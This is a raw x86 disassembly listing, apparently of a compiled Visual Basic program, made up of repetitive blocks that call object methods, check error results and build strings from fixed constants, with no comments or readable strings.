  403a63:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  403a69:	50                   	push   %eax
  403a6a:	8b 85 98 fe ff ff    	mov    -0x168(%ebp),%eax
  403a70:	57                   	push   %edi
  403a71:	e9 e3 fc ff ff       	jmp    0x403759
  403a76:	8b 16                	mov    (%esi),%edx
  403a78:	56                   	push   %esi
  403a79:	ff 92 04 03 00 00    	call   *0x304(%edx)
  403a7f:	50                   	push   %eax
  403a80:	8d 45 d0             	lea    -0x30(%ebp),%eax
  403a83:	50                   	push   %eax
  403a84:	ff d3                	call   *%ebx
  403a86:	8b 0e                	mov    (%esi),%ecx
  403a88:	56                   	push   %esi
  403a89:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  403a8f:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  403a95:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  403a98:	50                   	push   %eax
  403a99:	52                   	push   %edx
  403a9a:	ff d3                	call   *%ebx
  403a9c:	8b f8                	mov    %eax,%edi
  403a9e:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  403aa1:	51                   	push   %ecx
  403aa2:	57                   	push   %edi
  403aa3:	8b 07                	mov    (%edi),%eax
  403aa5:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  403aab:	85 c0                	test   %eax,%eax
  403aad:	db e2                	fnclex
  403aaf:	7d 12                	jge    0x403ac3
  403ab1:	68 a0 00 00 00       	push   $0xa0
  403ab6:	68 b8 24 40 00       	push   $0x4024b8
  403abb:	57                   	push   %edi
  403abc:	50                   	push   %eax
  403abd:	ff 15 28 10 40 00    	call   *0x401028
  403ac3:	8b 45 dc             	mov    -0x24(%ebp),%eax
  403ac6:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  403acc:	50                   	push   %eax
  403acd:	68 8c 25 40 00       	push   $0x40258c
  403ad2:	8b 3a                	mov    (%edx),%edi
  403ad4:	ff 15 20 10 40 00    	call   *0x401020
  403ada:	8b d0                	mov    %eax,%edx
  403adc:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  403adf:	ff 15 b8 10 40 00    	call   *0x4010b8
  403ae5:	8b cf                	mov    %edi,%ecx
  403ae7:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  403aed:	50                   	push   %eax
  403aee:	57                   	push   %edi
  403aef:	e9 83 23 00 00       	jmp    0x405e77
  403af4:	8b 06                	mov    (%esi),%eax
  403af6:	56                   	push   %esi
  403af7:	ff 90 04 03 00 00    	call   *0x304(%eax)
  403afd:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  403b00:	50                   	push   %eax
  403b01:	51                   	push   %ecx
  403b02:	ff d3                	call   *%ebx
  403b04:	8b 16                	mov    (%esi),%edx
  403b06:	56                   	push   %esi
  403b07:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  403b0d:	ff 92 04 03 00 00    	call   *0x304(%edx)
  403b13:	50                   	push   %eax
  403b14:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  403b17:	50                   	push   %eax
  403b18:	ff d3                	call   *%ebx
  403b1a:	8b f8                	mov    %eax,%edi
  403b1c:	8d 55 dc             	lea    -0x24(%ebp),%edx
  403b1f:	52                   	push   %edx
  403b20:	57                   	push   %edi
  403b21:	8b 0f                	mov    (%edi),%ecx
  403b23:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  403b29:	85 c0                	test   %eax,%eax
  403b2b:	db e2                	fnclex
  403b2d:	7d 12                	jge    0x403b41
  403b2f:	68 a0 00 00 00       	push   $0xa0
  403b34:	68 b8 24 40 00       	push   $0x4024b8
  403b39:	57                   	push   %edi
  403b3a:	50                   	push   %eax
  403b3b:	ff 15 28 10 40 00    	call   *0x401028
  403b41:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  403b44:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  403b4a:	51                   	push   %ecx
  403b4b:	68 94 25 40 00       	push   $0x402594
  403b50:	8b 38                	mov    (%eax),%edi
  403b52:	ff 15 20 10 40 00    	call   *0x401020
  403b58:	8b d0                	mov    %eax,%edx
  403b5a:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  403b5d:	ff 15 b8 10 40 00    	call   *0x4010b8
  403b63:	8b d7                	mov    %edi,%edx
  403b65:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  403b6b:	50                   	push   %eax
  403b6c:	57                   	push   %edi
  403b6d:	e9 4f fb ff ff       	jmp    0x4036c1
  403b72:	8b 0e                	mov    (%esi),%ecx
  403b74:	56                   	push   %esi
  403b75:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  403b7b:	8d 55 d0             	lea    -0x30(%ebp),%edx
  403b7e:	50                   	push   %eax
  403b7f:	52                   	push   %edx
  403b80:	ff d3                	call   *%ebx
  403b82:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  403b88:	8b 06                	mov    (%esi),%eax
  403b8a:	56                   	push   %esi
  403b8b:	ff 90 04 03 00 00    	call   *0x304(%eax)
  403b91:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  403b94:	50                   	push   %eax
  403b95:	51                   	push   %ecx
  403b96:	ff d3                	call   *%ebx
  403b98:	8b f8                	mov    %eax,%edi
  403b9a:	8d 45 dc             	lea    -0x24(%ebp),%eax
  403b9d:	50                   	push   %eax
  403b9e:	57                   	push   %edi
  403b9f:	8b 17                	mov    (%edi),%edx
  403ba1:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  403ba7:	85 c0                	test   %eax,%eax
  403ba9:	db e2                	fnclex
  403bab:	7d 12                	jge    0x403bbf
  403bad:	68 a0 00 00 00       	push   $0xa0
  403bb2:	68 b8 24 40 00       	push   $0x4024b8
  403bb7:	57                   	push   %edi
  403bb8:	50                   	push   %eax
  403bb9:	ff 15 28 10 40 00    	call   *0x401028
  403bbf:	8b 55 dc             	mov    -0x24(%ebp),%edx
  403bc2:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  403bc8:	52                   	push   %edx
  403bc9:	68 9c 25 40 00       	push   $0x40259c
  403bce:	8b 39                	mov    (%ecx),%edi
  403bd0:	ff 15 20 10 40 00    	call   *0x401020
  403bd6:	8b d0                	mov    %eax,%edx
  403bd8:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  403bdb:	ff 15 b8 10 40 00    	call   *0x4010b8
  403be1:	89 bd 8c fe ff ff    	mov    %edi,-0x174(%ebp)
  403be7:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  403bed:	50                   	push   %eax
  403bee:	8b 85 8c fe ff ff    	mov    -0x174(%ebp),%eax
  403bf4:	57                   	push   %edi
  403bf5:	e9 5f fb ff ff       	jmp    0x403759
  403bfa:	8b 16                	mov    (%esi),%edx
  403bfc:	56                   	push   %esi
  403bfd:	ff 92 04 03 00 00    	call   *0x304(%edx)
  403c03:	50                   	push   %eax
  403c04:	8d 45 d0             	lea    -0x30(%ebp),%eax
  403c07:	50                   	push   %eax
  403c08:	ff d3                	call   *%ebx
  403c0a:	8b 0e                	mov    (%esi),%ecx
  403c0c:	56                   	push   %esi
  403c0d:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  403c13:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  403c19:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  403c1c:	50                   	push   %eax
  403c1d:	52                   	push   %edx
  403c1e:	ff d3                	call   *%ebx
  403c20:	8b f8                	mov    %eax,%edi
  403c22:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  403c25:	51                   	push   %ecx
  403c26:	57                   	push   %edi
  403c27:	8b 07                	mov    (%edi),%eax
  403c29:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  403c2f:	85 c0                	test   %eax,%eax
  403c31:	db e2                	fnclex
  403c33:	7d 12                	jge    0x403c47
  403c35:	68 a0 00 00 00       	push   $0xa0
  403c3a:	68 b8 24 40 00       	push   $0x4024b8
  403c3f:	57                   	push   %edi
  403c40:	50                   	push   %eax
  403c41:	ff 15 28 10 40 00    	call   *0x401028
  403c47:	8b 45 dc             	mov    -0x24(%ebp),%eax
  403c4a:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  403c50:	50                   	push   %eax
  403c51:	68 a4 25 40 00       	push   $0x4025a4
  403c56:	8b 3a                	mov    (%edx),%edi
  403c58:	ff 15 20 10 40 00    	call   *0x401020
  403c5e:	8b d0                	mov    %eax,%edx
  403c60:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  403c63:	ff 15 b8 10 40 00    	call   *0x4010b8
  403c69:	8b cf                	mov    %edi,%ecx
  403c6b:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  403c71:	50                   	push   %eax
  403c72:	57                   	push   %edi
  403c73:	e9 ff 21 00 00       	jmp    0x405e77
  403c78:	8b 06                	mov    (%esi),%eax
  403c7a:	56                   	push   %esi
  403c7b:	ff 90 04 03 00 00    	call   *0x304(%eax)
  403c81:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  403c84:	50                   	push   %eax
  403c85:	51                   	push   %ecx
  403c86:	ff d3                	call   *%ebx
  403c88:	8b 16                	mov    (%esi),%edx
  403c8a:	56                   	push   %esi
  403c8b:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  403c91:	ff 92 04 03 00 00    	call   *0x304(%edx)
  403c97:	50                   	push   %eax
  403c98:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  403c9b:	50                   	push   %eax
  403c9c:	ff d3                	call   *%ebx
  403c9e:	8b f8                	mov    %eax,%edi
  403ca0:	8d 55 dc             	lea    -0x24(%ebp),%edx
  403ca3:	52                   	push   %edx
  403ca4:	57                   	push   %edi
  403ca5:	8b 0f                	mov    (%edi),%ecx
  403ca7:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  403cad:	85 c0                	test   %eax,%eax
  403caf:	db e2                	fnclex
  403cb1:	7d 12                	jge    0x403cc5
  403cb3:	68 a0 00 00 00       	push   $0xa0
  403cb8:	68 b8 24 40 00       	push   $0x4024b8
  403cbd:	57                   	push   %edi
  403cbe:	50                   	push   %eax
  403cbf:	ff 15 28 10 40 00    	call   *0x401028
  403cc5:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  403cc8:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  403cce:	51                   	push   %ecx
  403ccf:	68 ac 25 40 00       	push   $0x4025ac
  403cd4:	8b 38                	mov    (%eax),%edi
  403cd6:	ff 15 20 10 40 00    	call   *0x401020
  403cdc:	8b d0                	mov    %eax,%edx
  403cde:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  403ce1:	ff 15 b8 10 40 00    	call   *0x4010b8
  403ce7:	8b d7                	mov    %edi,%edx
  403ce9:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  403cef:	50                   	push   %eax
  403cf0:	57                   	push   %edi
  403cf1:	e9 cb f9 ff ff       	jmp    0x4036c1
  403cf6:	8b 0e                	mov    (%esi),%ecx
  403cf8:	56                   	push   %esi
  403cf9:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  403cff:	8d 55 d0             	lea    -0x30(%ebp),%edx
  403d02:	50                   	push   %eax
  403d03:	52                   	push   %edx
  403d04:	ff d3                	call   *%ebx
  403d06:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  403d0c:	8b 06                	mov    (%esi),%eax
  403d0e:	56                   	push   %esi
  403d0f:	ff 90 04 03 00 00    	call   *0x304(%eax)
  403d15:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  403d18:	50                   	push   %eax
  403d19:	51                   	push   %ecx
  403d1a:	ff d3                	call   *%ebx
  403d1c:	8b f8                	mov    %eax,%edi
  403d1e:	8d 45 dc             	lea    -0x24(%ebp),%eax
  403d21:	50                   	push   %eax
  403d22:	57                   	push   %edi
  403d23:	8b 17                	mov    (%edi),%edx
  403d25:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  403d2b:	85 c0                	test   %eax,%eax
  403d2d:	db e2                	fnclex
  403d2f:	7d 12                	jge    0x403d43
  403d31:	68 a0 00 00 00       	push   $0xa0
  403d36:	68 b8 24 40 00       	push   $0x4024b8
  403d3b:	57                   	push   %edi
  403d3c:	50                   	push   %eax
  403d3d:	ff 15 28 10 40 00    	call   *0x401028
  403d43:	8b 55 dc             	mov    -0x24(%ebp),%edx
  403d46:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  403d4c:	52                   	push   %edx
  403d4d:	68 b4 25 40 00       	push   $0x4025b4
  403d52:	8b 39                	mov    (%ecx),%edi
  403d54:	ff 15 20 10 40 00    	call   *0x401020
  403d5a:	8b d0                	mov    %eax,%edx
  403d5c:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  403d5f:	ff 15 b8 10 40 00    	call   *0x4010b8
  403d65:	89 bd 80 fe ff ff    	mov    %edi,-0x180(%ebp)
  403d6b:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  403d71:	50                   	push   %eax
  403d72:	8b 85 80 fe ff ff    	mov    -0x180(%ebp),%eax
  403d78:	57                   	push   %edi
  403d79:	e9 db f9 ff ff       	jmp    0x403759
  403d7e:	8b 16                	mov    (%esi),%edx
  403d80:	56                   	push   %esi
  403d81:	ff 92 04 03 00 00    	call   *0x304(%edx)
  403d87:	50                   	push   %eax
  403d88:	8d 45 d0             	lea    -0x30(%ebp),%eax
  403d8b:	50                   	push   %eax
  403d8c:	ff d3                	call   *%ebx
  403d8e:	8b 0e                	mov    (%esi),%ecx
  403d90:	56                   	push   %esi
  403d91:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  403d97:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  403d9d:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  403da0:	50                   	push   %eax
  403da1:	52                   	push   %edx
  403da2:	ff d3                	call   *%ebx
  403da4:	8b f8                	mov    %eax,%edi
  403da6:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  403da9:	51                   	push   %ecx
  403daa:	57                   	push   %edi
  403dab:	8b 07                	mov    (%edi),%eax
  403dad:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  403db3:	85 c0                	test   %eax,%eax
  403db5:	db e2                	fnclex
  403db7:	7d 12                	jge    0x403dcb
  403db9:	68 a0 00 00 00       	push   $0xa0
  403dbe:	68 b8 24 40 00       	push   $0x4024b8
  403dc3:	57                   	push   %edi
  403dc4:	50                   	push   %eax
  403dc5:	ff 15 28 10 40 00    	call   *0x401028
  403dcb:	8b 45 dc             	mov    -0x24(%ebp),%eax
  403dce:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  403dd4:	50                   	push   %eax
  403dd5:	68 bc 25 40 00       	push   $0x4025bc
  403dda:	8b 3a                	mov    (%edx),%edi
  403ddc:	ff 15 20 10 40 00    	call   *0x401020
  403de2:	8b d0                	mov    %eax,%edx
  403de4:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  403de7:	ff 15 b8 10 40 00    	call   *0x4010b8
  403ded:	8b cf                	mov    %edi,%ecx
  403def:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  403df5:	50                   	push   %eax
  403df6:	57                   	push   %edi
  403df7:	e9 7b 20 00 00       	jmp    0x405e77
  403dfc:	8b 06                	mov    (%esi),%eax
  403dfe:	56                   	push   %esi
  403dff:	ff 90 04 03 00 00    	call   *0x304(%eax)
  403e05:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  403e08:	50                   	push   %eax
  403e09:	51                   	push   %ecx
  403e0a:	ff d3                	call   *%ebx
  403e0c:	8b 16                	mov    (%esi),%edx
  403e0e:	56                   	push   %esi
  403e0f:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  403e15:	ff 92 04 03 00 00    	call   *0x304(%edx)
  403e1b:	50                   	push   %eax
  403e1c:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  403e1f:	50                   	push   %eax
  403e20:	ff d3                	call   *%ebx
  403e22:	8b f8                	mov    %eax,%edi
  403e24:	8d 55 dc             	lea    -0x24(%ebp),%edx
  403e27:	52                   	push   %edx
  403e28:	57                   	push   %edi
  403e29:	8b 0f                	mov    (%edi),%ecx
  403e2b:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  403e31:	85 c0                	test   %eax,%eax
  403e33:	db e2                	fnclex
  403e35:	7d 12                	jge    0x403e49
  403e37:	68 a0 00 00 00       	push   $0xa0
  403e3c:	68 b8 24 40 00       	push   $0x4024b8
  403e41:	57                   	push   %edi
  403e42:	50                   	push   %eax
  403e43:	ff 15 28 10 40 00    	call   *0x401028
  403e49:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  403e4c:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  403e52:	51                   	push   %ecx
  403e53:	68 c4 25 40 00       	push   $0x4025c4
  403e58:	8b 38                	mov    (%eax),%edi
  403e5a:	ff 15 20 10 40 00    	call   *0x401020
  403e60:	8b d0                	mov    %eax,%edx
  403e62:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  403e65:	ff 15 b8 10 40 00    	call   *0x4010b8
  403e6b:	8b d7                	mov    %edi,%edx
  403e6d:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  403e73:	50                   	push   %eax
  403e74:	57                   	push   %edi
  403e75:	e9 47 f8 ff ff       	jmp    0x4036c1
  403e7a:	8b 0e                	mov    (%esi),%ecx
  403e7c:	56                   	push   %esi
  403e7d:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  403e83:	8d 55 d0             	lea    -0x30(%ebp),%edx
  403e86:	50                   	push   %eax
  403e87:	52                   	push   %edx
  403e88:	ff d3                	call   *%ebx
  403e8a:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  403e90:	8b 06                	mov    (%esi),%eax
  403e92:	56                   	push   %esi
  403e93:	ff 90 04 03 00 00    	call   *0x304(%eax)
  403e99:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  403e9c:	50                   	push   %eax
  403e9d:	51                   	push   %ecx
  403e9e:	ff d3                	call   *%ebx
  403ea0:	8b 10                	mov    (%eax),%edx
  403ea2:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  403ea5:	51                   	push   %ecx
  403ea6:	50                   	push   %eax
  403ea7:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  403ead:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  403eb3:	85 c0                	test   %eax,%eax
  403eb5:	db e2                	fnclex
  403eb7:	7d 18                	jge    0x403ed1
  403eb9:	8b 95 48 ff ff ff    	mov    -0xb8(%ebp),%edx
  403ebf:	68 a0 00 00 00       	push   $0xa0
  403ec4:	68 b8 24 40 00       	push   $0x4024b8
  403ec9:	52                   	push   %edx
  403eca:	50                   	push   %eax
  403ecb:	ff 15 28 10 40 00    	call   *0x401028
  403ed1:	8b 45 dc             	mov    -0x24(%ebp),%eax
  403ed4:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  403eda:	89 45 98             	mov    %eax,-0x68(%ebp)
  403edd:	b8 08 00 00 00       	mov    $0x8,%eax
  403ee2:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  403ee5:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  403eec:	89 45 90             	mov    %eax,-0x70(%ebp)
  403eef:	c7 85 58 ff ff ff 54 	movl   $0x402554,-0xa8(%ebp)
  403ef6:	25 40 00 
  403ef9:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  403eff:	ff 15 ac 10 40 00    	call   *0x4010ac
  403f05:	c7 85 68 ff ff ff cc 	movl   $0x4025cc,-0x98(%ebp)
  403f0c:	25 40 00 
  403f0f:	8d 95 60 ff ff ff    	lea    -0xa0(%ebp),%edx
  403f15:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  403f18:	c7 85 60 ff ff ff 08 	movl   $0x8,-0xa0(%ebp)
  403f1f:	00 00 00 
  403f22:	ff 15 ac 10 40 00    	call   *0x4010ac
  403f28:	33 c0                	xor    %eax,%eax
  403f2a:	81 ff 00 80 ff ff    	cmp    $0xffff8000,%edi
  403f30:	0f 94 c0             	sete   %al
  403f33:	f7 d8                	neg    %eax
  403f35:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  403f38:	66 89 85 78 ff ff ff 	mov    %ax,-0x88(%ebp)
  403f3f:	8d 55 c0             	lea    -0x40(%ebp),%edx
  403f42:	51                   	push   %ecx
  403f43:	8d 85 70 ff ff ff    	lea    -0x90(%ebp),%eax
  403f49:	52                   	push   %edx
  403f4a:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  403f4d:	50                   	push   %eax
  403f4e:	51                   	push   %ecx
  403f4f:	c7 85 70 ff ff ff 0b 	movl   $0xb,-0x90(%ebp)
  403f56:	00 00 00 
  403f59:	ff 15 98 10 40 00    	call   *0x401098
  403f5f:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  403f65:	8d 45 90             	lea    -0x70(%ebp),%eax
  403f68:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  403f6b:	50                   	push   %eax
  403f6c:	8b 3a                	mov    (%edx),%edi
  403f6e:	8d 55 80             	lea    -0x80(%ebp),%edx
  403f71:	51                   	push   %ecx
  403f72:	52                   	push   %edx
  403f73:	ff 15 7c 10 40 00    	call   *0x40107c
  403f79:	50                   	push   %eax
  403f7a:	8d 45 d8             	lea    -0x28(%ebp),%eax
  403f7d:	50                   	push   %eax
  403f7e:	ff 15 78 10 40 00    	call   *0x401078
  403f84:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  403f8a:	50                   	push   %eax
  403f8b:	51                   	push   %ecx
  403f8c:	ff 97 a4 00 00 00    	call   *0xa4(%edi)
  403f92:	85 c0                	test   %eax,%eax
  403f94:	db e2                	fnclex
  403f96:	0f 8d 06 15 00 00    	jge    0x4054a2
  403f9c:	e9 e9 14 00 00       	jmp    0x40548a
  403fa1:	8b 16                	mov    (%esi),%edx
  403fa3:	56                   	push   %esi
  403fa4:	ff 92 04 03 00 00    	call   *0x304(%edx)
  403faa:	50                   	push   %eax
  403fab:	8d 45 d0             	lea    -0x30(%ebp),%eax
  403fae:	50                   	push   %eax
  403faf:	ff d3                	call   *%ebx
  403fb1:	8b 0e                	mov    (%esi),%ecx
  403fb3:	56                   	push   %esi
  403fb4:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  403fba:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  403fc0:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  403fc3:	50                   	push   %eax
  403fc4:	52                   	push   %edx
  403fc5:	ff d3                	call   *%ebx
  403fc7:	8b 08                	mov    (%eax),%ecx
  403fc9:	8d 55 dc             	lea    -0x24(%ebp),%edx
  403fcc:	52                   	push   %edx
  403fcd:	50                   	push   %eax
  403fce:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  403fd4:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  403fda:	85 c0                	test   %eax,%eax
  403fdc:	db e2                	fnclex
  403fde:	7d 18                	jge    0x403ff8
  403fe0:	8b 8d 48 ff ff ff    	mov    -0xb8(%ebp),%ecx
  403fe6:	68 a0 00 00 00       	push   $0xa0
  403feb:	68 b8 24 40 00       	push   $0x4024b8
  403ff0:	51                   	push   %ecx
  403ff1:	50                   	push   %eax
  403ff2:	ff 15 28 10 40 00    	call   *0x401028
  403ff8:	8b 45 dc             	mov    -0x24(%ebp),%eax
  403ffb:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  404001:	89 45 98             	mov    %eax,-0x68(%ebp)
  404004:	b8 08 00 00 00       	mov    $0x8,%eax
  404009:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  40400c:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  404013:	89 45 90             	mov    %eax,-0x70(%ebp)
  404016:	c7 85 58 ff ff ff 5c 	movl   $0x40255c,-0xa8(%ebp)
  40401d:	25 40 00 
  404020:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  404026:	ff 15 ac 10 40 00    	call   *0x4010ac
  40402c:	8d 95 60 ff ff ff    	lea    -0xa0(%ebp),%edx
  404032:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  404035:	c7 85 68 ff ff ff d4 	movl   $0x4025d4,-0x98(%ebp)
  40403c:	25 40 00 
  40403f:	c7 85 60 ff ff ff 08 	movl   $0x8,-0xa0(%ebp)
  404046:	00 00 00 
  404049:	ff 15 ac 10 40 00    	call   *0x4010ac
  40404f:	33 d2                	xor    %edx,%edx
  404051:	81 ff 00 80 ff ff    	cmp    $0xffff8000,%edi
  404057:	0f 94 c2             	sete   %dl
  40405a:	f7 da                	neg    %edx
  40405c:	8d 45 b0             	lea    -0x50(%ebp),%eax
  40405f:	66 89 95 78 ff ff ff 	mov    %dx,-0x88(%ebp)
  404066:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  404069:	50                   	push   %eax
  40406a:	8d 95 70 ff ff ff    	lea    -0x90(%ebp),%edx
  404070:	51                   	push   %ecx
  404071:	8d 45 a0             	lea    -0x60(%ebp),%eax
  404074:	52                   	push   %edx
  404075:	50                   	push   %eax
  404076:	c7 85 70 ff ff ff 0b 	movl   $0xb,-0x90(%ebp)
  40407d:	00 00 00 
  404080:	ff 15 98 10 40 00    	call   *0x401098
  404086:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  40408c:	8d 55 90             	lea    -0x70(%ebp),%edx
  40408f:	8d 45 a0             	lea    -0x60(%ebp),%eax
  404092:	52                   	push   %edx
  404093:	8b 39                	mov    (%ecx),%edi
  404095:	8d 4d 80             	lea    -0x80(%ebp),%ecx
  404098:	50                   	push   %eax
  404099:	51                   	push   %ecx
  40409a:	ff 15 7c 10 40 00    	call   *0x40107c
  4040a0:	8d 55 d8             	lea    -0x28(%ebp),%edx
  4040a3:	50                   	push   %eax
  4040a4:	52                   	push   %edx
  4040a5:	ff 15 78 10 40 00    	call   *0x401078
  4040ab:	50                   	push   %eax
  4040ac:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  4040b2:	50                   	push   %eax
  4040b3:	ff 97 a4 00 00 00    	call   *0xa4(%edi)
  4040b9:	85 c0                	test   %eax,%eax
  4040bb:	db e2                	fnclex
  4040bd:	7d 18                	jge    0x4040d7
  4040bf:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  4040c5:	68 a4 00 00 00       	push   $0xa4
  4040ca:	68 b8 24 40 00       	push   $0x4024b8
  4040cf:	51                   	push   %ecx
  4040d0:	50                   	push   %eax
  4040d1:	ff 15 28 10 40 00    	call   *0x401028
  4040d7:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4040da:	ff 15 cc 10 40 00    	call   *0x4010cc
  4040e0:	8d 55 d0             	lea    -0x30(%ebp),%edx
  4040e3:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  4040e6:	52                   	push   %edx
  4040e7:	50                   	push   %eax
  4040e8:	6a 02                	push   $0x2
  4040ea:	ff 15 18 10 40 00    	call   *0x401018
  4040f0:	8d 4d 80             	lea    -0x80(%ebp),%ecx
  4040f3:	8d 55 a0             	lea    -0x60(%ebp),%edx
  4040f6:	51                   	push   %ecx
  4040f7:	8d 45 90             	lea    -0x70(%ebp),%eax
  4040fa:	52                   	push   %edx
  4040fb:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  4040fe:	50                   	push   %eax
  4040ff:	8d 55 c0             	lea    -0x40(%ebp),%edx
  404102:	51                   	push   %ecx
  404103:	8d 85 70 ff ff ff    	lea    -0x90(%ebp),%eax
  404109:	52                   	push   %edx
  40410a:	50                   	push   %eax
  40410b:	6a 06                	push   $0x6
  40410d:	ff 15 10 10 40 00    	call   *0x401010
  404113:	83 c4 28             	add    $0x28,%esp
  404116:	e9 9d 1f 00 00       	jmp    0x4060b8
  40411b:	8b 0e                	mov    (%esi),%ecx
  40411d:	56                   	push   %esi
  40411e:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  404124:	8d 55 d0             	lea    -0x30(%ebp),%edx
  404127:	50                   	push   %eax
  404128:	52                   	push   %edx
  404129:	ff d3                	call   *%ebx
  40412b:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  404131:	8b 06                	mov    (%esi),%eax
  404133:	56                   	push   %esi
  404134:	ff 90 04 03 00 00    	call   *0x304(%eax)
  40413a:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  40413d:	50                   	push   %eax
  40413e:	51                   	push   %ecx
  40413f:	ff d3                	call   *%ebx
  404141:	8b 10                	mov    (%eax),%edx
  404143:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  404146:	51                   	push   %ecx
  404147:	50                   	push   %eax
  404148:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  40414e:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  404154:	85 c0                	test   %eax,%eax
  404156:	db e2                	fnclex
  404158:	7d 18                	jge    0x404172
  40415a:	8b 95 48 ff ff ff    	mov    -0xb8(%ebp),%edx
  404160:	68 a0 00 00 00       	push   $0xa0
  404165:	68 b8 24 40 00       	push   $0x4024b8
  40416a:	52                   	push   %edx
  40416b:	50                   	push   %eax
  40416c:	ff 15 28 10 40 00    	call   *0x401028
  404172:	8b 45 dc             	mov    -0x24(%ebp),%eax
  404175:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  40417b:	89 45 98             	mov    %eax,-0x68(%ebp)
